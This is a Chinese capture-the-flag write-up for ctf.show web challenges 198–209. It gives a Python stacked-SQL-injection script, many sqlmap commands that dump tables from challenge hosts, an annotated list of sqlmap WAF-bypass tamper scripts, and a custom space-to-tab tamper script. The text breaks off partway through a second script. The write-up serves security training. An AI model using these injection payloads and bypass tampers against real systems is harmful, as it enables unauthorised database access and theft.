<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://86f793a3-65c1-4974-8b76-8276d42d488c.challenge.ctf.show:8080/api/"</span></span><br><span class="line">payload = <span class="string">'0x61646d696e;alter table ctfshow_user change column `pass` `gylq` varchar(255);alter table ctfshow_user change column `id` `pass` varchar(255);alter table ctfshow_user change column `gylq` `id` varchar(255);'</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">'username'</span>: payload,</span><br><span class="line">    <span class="string">'password'</span>: <span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url,data1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</span><br><span class="line">    data2 = &#123;</span><br><span class="line">        <span class="string">'username'</span>: <span class="string">"0x61646d696e"</span>,</span><br><span class="line">        <span class="string">'password'</span>: <span class="string">'&#123;&#125;'</span>.format(i)</span><br><span class="line">    &#125;</span><br><span class="line">    res2 = requests.post(url,data2)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> res2.json()[<span class="string">'msg'</span>]:</span><br><span class="line">        print(res2.json()[<span class="string">'msg'</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web199"><a href="#web199" class="headerlink" title="web199"></a>web199</h2><blockquote>
<ul>
<li>不变197做法</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730221610705.png" alt="image-20210730221610705"></p>
<h2 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h2><blockquote>
<p>和上题一样</p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730221717415.png" alt="image-20210730221717415"></p>
<h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><blockquote>
<ul>
<li><strong>提示referer标头，查了下资料，默认情况不会对referer发起http请求，但是这题不发就得不到数据，所以可以自行设置referer或者直接level 3</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730231149582.png" alt="image-20210730231149582"></p>
<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://920f2767-9c9c-4d91-9b71-087536fabffe.challenge.ctf.show:<span class="number">8080</span>/api/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">" --threads=10 --batch --referer="</span>ctf.show<span class="string">" --dbs</span></span><br></pre></td></tr></table></figure></div>

<p><strong>或者 level 3</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;920f2767-9c9c-4d91-9b71-087536fabffe.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&quot; --threads&#x3D;10 --batch --level 3 --dbs</span><br></pre></td></tr></table></figure></div>

<p><strong>查表</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u "http://920f2767-9c9c-4d91-9b71-087536fabffe.challenge.ctf.show:<span class="number">8080</span>/api/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">" --threads=10 --batch --referer="</span>ctf.show<span class="string">" -D ctfshow_web --tables</span></span><br></pre></td></tr></table></figure></div>

<p><strong>查字段</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;920f2767-9c9c-4d91-9b71-087536fabffe.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&quot; --threads&#x3D;10 --batch --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user --columns</span><br></pre></td></tr></table></figure></div>

<p><strong>查flag</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://eb8102e6-5c61-4b70-8a29-24de83d6b0b2.challenge.ctf.show:<span class="number">8080</span>/api/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">" --threads=10 --batch --referer="</span>ctf.show<span class="string">" -D ctfshow_web -T ctfshow_user -C pass --dump --where "</span>pass <span class="keyword">like</span> <span class="string">'%ctfshow%'</span><span class="string">"</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730232141620.png" alt="image-20210730232141620"></p>
<h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><blockquote>
<ul>
<li>就是用–data指定post传参</li>
</ul>
</blockquote>
<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://c339fde0-4900-495d-bcf0-7872c3937afa.challenge.ctf.show:<span class="number">8080</span>/api/<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --threads=10 --batch  --referer="</span>ctf.show<span class="string">" -D ctfshow_web -T ctfshow_user -C pass --dump --where="</span>pass <span class="keyword">like</span> <span class="string">'%ctf%'</span><span class="string">"</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><blockquote>
<ul>
<li><strong>将method改成put，并且注意更改content-type为text/plain，否则会被提交成表单</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://fa1b6901-9336-417b-9abf-3b0d199ed673.challenge.ctf.show:<span class="number">8080</span>/api/index.php<span class="string">" --referer="</span>ctf.show<span class="string">" --batch --method="</span>PUT<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --headers="</span><span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/plain<span class="string">" --threads=10 -D ctfshow_web -T ctfshow_user -C pass --dump --where="</span>pass <span class="keyword">like</span> <span class="string">'%ctf%'</span><span class="string">"</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><blockquote>
<ul>
<li>提示传递cookie，抓包拿</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://74013a20-89e2-4675-a59b-40916d4e4712.challenge.ctf.show:<span class="number">8080</span>/api/index.php<span class="string">" --referer="</span>ctf.show<span class="string">" --batch --method="</span>PUT<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --headers="</span><span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/plain<span class="string">" --threads=10 -D ctfshow_web -T ctfshow_user -C pass --dump --where="</span>pass <span class="keyword">like</span> <span class="string">'%ctf%'</span><span class="string">"  -v 5  --cookie="</span>PHPSESSID=hnfvub4a2sfnmofk3g7r28vc39; ctfshow=72a5a5bfd041b4dc7fac9cfa9f868db6"</span><br></pre></td></tr></table></figure></div>

<h2 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h2><blockquote>
<ul>
<li><strong>要api鉴权我们抓包可以发现他是先/api/getToken.php，然后再访问/api/index.php，根据浏览器里面select.js文件代码分析也可以发现</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731085139350.png" alt="image-20210731085139350"></p>
<p>sqlmap中提供以下两个参数保证每次都能访问一次一次getToken.php来获取token</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--safe-url 提供一个安全不错误的连接，每隔一段时间都会去访问一下</span><br><span class="line">--safe-freq 提供一个安全不错误的连接，设置每次注入测试前访问安全链接的次数</span><br></pre></td></tr></table></figure></div>

<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://a99900ec-4bec-4ef1-b046-2a62a2f8fc22.challenge.ctf.show:<span class="number">8080</span>/api/index.php<span class="string">" --referer="</span>ctf.show<span class="string">" --batch --method="</span>PUT<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --headers="</span><span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/plain<span class="string">" --threads=10 --cookie="</span>PHPSESSID=hnfvub4a2sfnmofk3g7r28vc39; ctfshow=72a5a5bfd041b4dc7fac9cfa9f868db6" <span class="comment">--safe-url="http://a99900ec-4bec-4ef1-b046-2a62a2f8fc22.challenge.ctf.show:8080/api/getToken.php" --safe-freq=1 -D ctfshow_web -T ctfshow_flax -C flagx --where="flagx like 'ctf%'" --dump</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h2><blockquote>
<ul>
<li>和上题一样做法，就是换了字段名</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://d531f359-f004-4421-b15c-7c0fd7ec6b24.challenge.ctf.show:<span class="number">8080</span>/api/index.php<span class="string">" --referer="</span>ctf.show<span class="string">" --batch --method="</span>PUT<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --headers="</span><span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/plain<span class="string">" --threads=10 --cookie="</span>PHPSESSID=hnfvub4a2sfnmofk3g7r28vc39; ctfshow=72a5a5bfd041b4dc7fac9cfa9f868db6" <span class="comment">--safe-url="http://d531f359-f004-4421-b15c-7c0fd7ec6b24.challenge.ctf.show:8080/api/getToken.php" --safe-freq=1  -D ctfshow_web -T  ctfshow_flaxc -C flagv --dump</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h2><blockquote>
<ul>
<li>tamper的初体验，看到过滤了空格</li>
</ul>
</blockquote>
<p>遇到这种情况怎么办？sqlmap提供了tamper脚本用于应对此种情况，tamper的出现是为了引入用户自定义的脚本来修改payload以达到绕过waf的目的。sqlmap自带的tamper脚本文件都在sqlmap的tamper文件夹下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">举例如下tamper脚本：</span><br><span class="line"></span><br><span class="line">apostrophemask.py 用utf8代替引号</span><br><span class="line"></span><br><span class="line">equaltolike.py MSSQL * SQLite中like 代替等号</span><br><span class="line"></span><br><span class="line">greatest.py MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号</span><br><span class="line"></span><br><span class="line">space2hash.py 空格替换为<span class="comment">#号 随机字符串 以及换行符</span></span><br><span class="line"></span><br><span class="line">space2comment.py 用<span class="comment">/**/</span>代替空格</span><br><span class="line"></span><br><span class="line">apostrophenullencode.py MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</span><br><span class="line"></span><br><span class="line">space2morehash.py MySQL中空格替换为 <span class="comment">#号 以及更多随机字符串 换行符</span></span><br><span class="line"></span><br><span class="line">appendnullbyte.p Microsoft Access在有效负荷结束位置加载零字节字符编码</span><br><span class="line"></span><br><span class="line">ifnull2ifisnull.py MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤</span><br><span class="line"></span><br><span class="line">space2mssqlblank.py mssql空格替换为其它空符号</span><br><span class="line"></span><br><span class="line">base64encode.py 用base64编码</span><br><span class="line"></span><br><span class="line">space2mssqlhash.py mssql查询中替换空格</span><br><span class="line"></span><br><span class="line">modsecurityversioned.py mysql中过滤空格，包含完整的查询版本注释</span><br><span class="line"></span><br><span class="line">space2mysqlblank.py mysql中空格替换其它空白符号</span><br><span class="line"></span><br><span class="line">between.py MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）</span><br><span class="line"></span><br><span class="line">space2mysqldash.py MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</span><br><span class="line"></span><br><span class="line">multiplespaces.py 围绕SQL关键字添加多个空格</span><br><span class="line"></span><br><span class="line">space2plus.py 用+替换空格</span><br><span class="line"></span><br><span class="line">bluecoat.py MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</span><br><span class="line"></span><br><span class="line">nonrecursivereplacement.py 双重查询语句。取代predefined SQL关键字<span class="keyword">with</span>表示 suitable <span class="keyword">for</span>替代</span><br><span class="line"></span><br><span class="line">space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集</span><br><span class="line"></span><br><span class="line">sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的<span class="number">26</span> 有效载荷的末尾</span><br><span class="line"></span><br><span class="line">chardoubleencode.py 双<span class="keyword">url</span>编码(不处理以编码的)</span><br><span class="line"></span><br><span class="line">unionalltounion.py 替换<span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span></span><br><span class="line"></span><br><span class="line">charencode.py Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span> <span class="number">2005</span>，MySQL <span class="number">4</span>, <span class="number">5.0</span> <span class="keyword">and</span> <span class="number">5.5</span>，<span class="keyword">Oracle</span> <span class="number">10</span>g，PostgreSQL <span class="number">8.3</span>, <span class="number">8.4</span>, <span class="number">9.0</span><span class="keyword">url</span>编码；</span><br><span class="line"></span><br><span class="line">randomcase.py Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span> <span class="number">2005</span>，MySQL <span class="number">4</span>, <span class="number">5.0</span> <span class="keyword">and</span> <span class="number">5.5</span>，<span class="keyword">Oracle</span> <span class="number">10</span>g，PostgreSQL <span class="number">8.3</span>, <span class="number">8.4</span>, <span class="number">9.0</span>中随机大小写</span><br><span class="line"></span><br><span class="line">unmagicquotes.py 宽字符绕过 GPC addslashes</span><br><span class="line"></span><br><span class="line">randomcomments.py 用<span class="comment">/**/</span>分割<span class="keyword">sql</span>关键字</span><br><span class="line"></span><br><span class="line">charunicodeencode.py ASP，ASP.NET中字符串 <span class="keyword">unicode</span> 编码</span><br><span class="line"></span><br><span class="line">securesphere.py 追加特制的字符串</span><br><span class="line"></span><br><span class="line">versionedmorekeywords.py MySQL &gt;= <span class="number">5.1</span><span class="number">.13</span>注释绕过</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py MySQL &lt; <span class="number">5.1</span>中关键字前加注释</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://a83c7e70-64d2-4dab-9232-8c5080415bd1.challenge.ctf.show:<span class="number">8080</span>/api/index.php<span class="string">" --referer="</span>ctf.show<span class="string">" --batch --method="</span>PUT<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --headers="</span><span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/plain<span class="string">" --threads=10 --cookie="</span>PHPSESSID=hnfvub4a2sfnmofk3g7r28vc39; ctfshow=72a5a5bfd041b4dc7fac9cfa9f868db6" <span class="comment">--safe-url="http://a83c7e70-64d2-4dab-9232-8c5080415bd1.challenge.ctf.show:8080/api/getToken.php" --safe-freq=1 --tamper=mycomment -D ctfshow_web -T ctfshow_flaxca --dump</span></span><br></pre></td></tr></table></figure></div>

<p>根据原本的space2comment仿写了一个，将注释换成了<code>0x09</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Author:孤桜懶契</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">"By孤桜懶契-空格替换制表符0x09"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    payload = space2comment(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">space2comment</span><span class="params">(payload)</span>:</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">""</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += chr(<span class="number">0x09</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">'\''</span>:</span><br><span class="line">                    quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">'"'</span>:</span><br><span class="line">                    doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">" "</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                    retVal += chr(<span class="number">0x09</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>

<h2 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">// $id = str_replace('<span class="keyword">select</span><span class="string">', '', $id);</span></span><br><span class="line"><span class="string">  function waf($str)&#123;</span></span><br><span class="line"><span class="string">   return preg_match('</span>/ /<span class="string">', $str);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>只过滤了小写的select，sqlmap自己就会跑大写的</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://90811f8e-b2c5-4181-ac8a-2752c4d91c40.challenge.ctf.show:<span class="number">8080</span>/api/index.php<span class="string">" --referer="</span>ctf.show<span class="string">" --batch --method="</span>PUT<span class="string">" --data="</span><span class="keyword">id</span>=<span class="number">1</span><span class="string">" --headers="</span><span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/plain<span class="string">" --threads=10 --cookie="</span>PHPSESSID=hnfvub4a2sfnmofk3g7r28vc39; ctfshow=72a5a5bfd041b4dc7fac9cfa9f868db6" <span class="comment">--safe-url="http://90811f8e-b2c5-4181-ac8a-2752c4d91c40.challenge.ctf.show:8080/api/getToken.php" --safe-freq=1 --tamper=mycomment -D ctfshow_web -T ctfshow_flaxcac --dump</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">   //TODO 未完工</span><br><span class="line">   return preg_match('/ |\*|\=/', $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><strong>多过滤了*号和=号，我们在上面的脚本多加一个匹配=号换like</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;e83f1efc-354e-42c0-8c2e-ca9eafd2f81d.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --batch --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --threads&#x3D;10 --cookie&#x3D;&quot;PHPSESSID&#x3D;hnfvub4a2sfnmofk3g7r28vc39; ctfshow&#x3D;72a5a5bfd041b4dc7fac9cfa9f868db6&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;e83f1efc-354e-42c0-8c2e-ca9eafd2f81d.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;mycomment  -D ctfshow_web -T ctfshow_flav --dump</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Author:孤桜懶契</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span 